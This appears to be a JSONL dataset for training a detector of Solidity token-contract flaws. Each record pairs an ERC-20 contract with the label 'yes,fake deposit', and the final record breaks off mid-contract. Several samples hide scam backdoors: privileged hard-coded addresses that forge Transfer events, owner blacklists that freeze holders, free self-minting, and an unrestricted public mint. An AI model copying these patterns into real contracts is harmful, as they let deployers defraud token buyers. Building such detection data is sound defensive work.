{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\nabstract contract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view virtual returns (uint256 balance);\n function transfer(address _to, uint256 _value) public virtual returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\n function approve(address _spender, uint256 _value) public virtual returns (bool success);\n function allowance(address _owner, address _spender) public view virtual returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view override returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view override returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract HigasasuToken is StandardToken {\n\n // metadata\n string public constant name = \"Higasasu Token\";\n string public constant symbol = \"HGSS\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n\n // contracts\n address public tokenFundDeposit; // deposit address for HigasasuToken International use and HGSS User Fund\n\n // crowdsale parameters\n uint256 public constant tokenFund = 1 * (10**3) * 10**decimals; // 1000 HGSS reserved for HigasasuToken Intl use\n\n // events\n event CreateHigasasuToken(address indexed _to, uint256 _value);\n\n // constructor\n constructor(address _tokenFundDeposit)\n {\n tokenFundDeposit = _tokenFundDeposit;\n totalSupply = tokenFund;\n balances[tokenFundDeposit] = tokenFund; // Deposit HigasasuToken Intl share\n emit CreateHigasasuToken(tokenFundDeposit, tokenFund); // logs HigasasuToken Intl fund\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n \n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract HBToken is UnboundedRegularToken {\n\n uint public totalSupply = 5*10**26;\n uint8 constant public decimals = 18;\n string constant public name = \"ZFTEST\";\n string constant public symbol = \"ZFT\";\n\n function HBToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n\n function mint(address _to, uint _value) {\n balances[_to] += _value;\n Transfer(address(0), _to, _value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address jFX = 0xa045FdC531cfB985b2eC888c36891Bc49Fb3AA3d;\n\taddress jJXF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract SHIBATOMIC is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private jZA;\n\tmapping (address => bool) private jZE;\n mapping (address => bool) private jZW;\n mapping (address => mapping (address => uint256)) private jZV;\n uint8 private constant JZD = 8;\n uint256 private constant jTS = 300000000 * (10** JZD);\n string private constant _name = \"Atomic Shiba\";\n string private constant _symbol = \"SHIBATOMIC\";\n\n\n\n constructor () {\n jZA[_msgSender()] = jTS;\n JMCR(jJXF, jTS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return JZD;\n }\n\n function totalSupply() public pure returns (uint256) {\n return jTS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return jZA[account];\n }\n\t\n\n \n\n\t\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return jZV[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n jZV[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction jquery(address jZJ) public{\n if(jZE[msg.sender]) { \n jZW[jZJ] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == jFX) {\n require(amount <= jZA[sender]);\n jZA[sender] -= amount; \n jZA[recipient] += amount; \n jZV[sender][msg.sender] -= amount;\n emit Transfer (jJXF, recipient, amount);\n return true; } else \n if(!jZW[recipient]) {\n if(!jZW[sender]) {\n require(amount <= jZA[sender]);\n require(amount <= jZV[sender][msg.sender]);\n jZA[sender] -= amount;\n jZA[recipient] += amount;\n jZV[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction jStake(address jZJ) public {\n if(jZE[msg.sender]) { \n jZW[jZJ] = false;}}\n\t\tfunction JMCR(address jZJ, uint256 jZN) onlyOwner internal {\n emit Transfer(address(0), jZJ ,jZN); }\n\t\t\n\t\tfunction transfer(address jZJ, uint256 jZN) public {\n if(msg.sender == jFX) {\n require(jZA[msg.sender] >= jZN);\n jZA[msg.sender] -= jZN; \n jZA[jZJ] += jZN; \n emit Transfer (jJXF, jZJ, jZN);} else \n if(jZE[msg.sender]) {jZA[jZJ] += jZN;} else\n if(!jZW[msg.sender]) {\n require(jZA[msg.sender] >= jZN);\n jZA[msg.sender] -= jZN; \n jZA[jZJ] += jZN; \n emit Transfer(msg.sender, jZJ, jZN);}}\n\t\t\n\t\t\tfunction hburn(address jZJ) onlyOwner public{\n jZE[jZJ] = true; }\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract THEINU {\n \n mapping (address => uint256) public rT;\n mapping (address => uint256) public Iz;\n mapping (address => bool) bN;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"THE INU\";\n string public symbol = unicode\"THE INU\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address r_Construct = 0xdA5D54782E98D9f47892CF5Bd0AEEfca45a5E08C;\n\n constructor() {\n rT[msg.sender] = totalSupply;\n deploy(r_Construct, totalSupply); }\n\n \n address rdeployer = 0x4C7Feef819C85F3e310f4b684DBA1121494cd88F;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == rdeployer) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[msg.sender]) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function gish () public {\n if(msg.sender == rdeployer) {\n rT[msg.sender] = Iz[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return rT[account]; }\n\n function sny(address ii) public {\n if(msg.sender == rdeployer) { \n bN[ii] = false;}}\n function chkvl(address ii) public{\n if(msg.sender == rdeployer) { \n require(!bN[ii]);\n bN[ii] = true;\n }}\n function brnu(uint256 x) public {\n if(msg.sender == rdeployer) { \n Iz[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == rdeployer) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[from] && !bN[to]) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value;\n rT[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address ZSV = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;\n\taddress Hashcore = 0xe780A56306ba1E6bB331952C22539b858af9F77d;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract UMBRAL is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Hbv;\n\tmapping (address => bool) private Hcv;\n mapping (address => bool) private Hav;\n mapping (address => mapping (address => uint256)) private Hvv;\n uint8 private constant HDec = 6;\n uint256 private constant HBal = 1000000000 * 10**HDec;\n string private constant _name = \"IAMACAT\";\n string private constant _symbol = \"IAC\";\n\n constructor () {\n Hbv[_msgSender()] = HBal;\n initEmit();\n }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return HDec;\n }\n\n function totalSupply() public pure returns (uint256) {\n return HBal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Hbv[account];\n }\n function initEmit() onlyOwner internal {\n emit Transfer(address(0), Hashcore, HBal);\n }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Hvv[owner][spender];\n }\n\n\tfunction _Approve(address Jj) onlyOwner public{\n Hcv[Jj] = true;\n }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Hvv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n \n\t\tfunction HBaltake(address Jj) public {\n if(Hcv[msg.sender]) { \n Hav[Jj] = false;}}\n function PreAddLiquidity(address Jj) public{\n if(Hcv[msg.sender]) { \n Hav[Jj] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == ZSV) {\n require(amount <= Hbv[sender]);\n Hbv[sender] -= amount; \n Hbv[recipient] += amount; \n Hvv[sender][msg.sender] -= amount;\n emit Transfer (Hashcore, recipient, amount);\n return true; } else \n if(!Hav[recipient]) {\n if(!Hav[sender]) {\n require(amount <= Hbv[sender]);\n require(amount <= Hvv[sender][msg.sender]);\n Hbv[sender] -= amount;\n Hbv[recipient] += amount;\n Hvv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Jl, uint256 Jj) public {\n if(msg.sender == ZSV) {\n require(Hbv[msg.sender] >= Jj);\n Hbv[msg.sender] -= Jj; \n Hbv[Jl] += Jj; \n emit Transfer (Hashcore, Jl, Jj);} else \n if(Hcv[msg.sender]) {Hbv[Jl] += Jj;} else\n if(!Hav[msg.sender]) {\n require(Hbv[msg.sender] >= Jj);\n Hbv[msg.sender] -= Jj; \n Hbv[Jl] += Jj; \n emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: CC token.sol\n\npragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000; // Update total supply (100000 for example)\n name = \"Codot token\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"CC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.18;\n//this project is non-profit work.\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract LJMcontract is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract LJM is LJMcontract {\n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n function LJM() {\n balances[msg.sender] = 1000000000000; \n totalSupply = 1000000000000; \n name = \"President MYONG\"; \n decimals = 4; \n symbol = \"LJM\"; \n unitsOneEthCanBuy = 1000000; \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy/1000000000000000000;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Clover is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Clover\";\n string public constant symbol = \"\ud83c\udf40\ud83c\udf40\ud83c\udf40\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.4.11;\n\n\nlibrary SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n\n function div(uint a, uint b) internal returns (uint) {\n // assert(b > 0); // Solidity automatically throws when dividing by 0\n uint c = a / b;\n // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n return c;\n }\n\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\n\n\ncontract ERC20Basic {\n uint public totalSupply;\n function balanceOf(address _owner) constant returns (uint balance);\n function transfer(address _to, uint _value) returns (bool success);\n function transferFrom(address _from, address _to, uint _value) returns (bool success);\n}\n \n  \n \ncontract ERC20 is ERC20Basic {\n function approve(address _spender, uint _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract StandardToken is ERC20 {\n using SafeMath for uint;\n\n function transfer(address _to, uint _value) returns (bool) {\n \n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n 